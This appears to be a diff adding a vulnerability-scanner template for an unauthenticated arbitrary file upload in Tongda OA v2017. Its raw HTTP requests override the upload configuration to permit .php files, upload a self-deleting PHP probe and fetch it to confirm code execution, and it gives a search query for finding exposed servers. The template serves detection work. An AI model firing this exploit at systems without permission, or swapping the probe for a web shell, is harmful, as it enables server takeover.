@@ -1,0 +1,66 @@
+id: tongda-oa-action-upload-file-upload
+
+info:
+  name: Tongda OA v2017 action_upload.php Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: |
+    通达OA v2017的 `action_upload.php` 接口存在文件过滤不足且无需后台权限，导致任意文件上传漏洞。攻击者可以通过该漏洞上传任意文件，从而获取服务器权限。
+  metadata:
+    fofa-query: 'app="TDXK-通达OA"'
+  tags: tongda, file-upload, rce
+
+variables:
+  filename: "{{rand_base(6)}}"
+  num1: "{{rand_int(10000, 20000)}}"
+  num2: "{{rand_int(10000, 20000)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+  boundary: "{{rand_base(29)}}"
+
+http:
+  - raw:
+      - |
+        POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}
+        X-requested-with: XMLHttpRequest
+        Accept-Encoding: gzip
+
+        -----------------------------{{boundary}}
+        Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+        ffff
+        -----------------------------{{boundary}}
+        Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+        1000000000
+        -----------------------------{{boundary}}
+        Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+        {{filename}}
+        -----------------------------{{boundary}}
+        Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+        .php
+        -----------------------------{{boundary}}
+        Content-Disposition: form-data; name="ffff"; filename="test.php"
+        Content-Type: application/octet-stream
+
+        <?php print({{num1}}*{{num2}});unlink(__FILE__);?>
+        -----------------------------{{boundary}}
+        Content-Disposition: form-data; name="mufile"
+
+        submit
+        -----------------------------{{boundary}}--
+      
+      - |
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200
+          - contains(body_2, '{{result}}')
+        condition: and
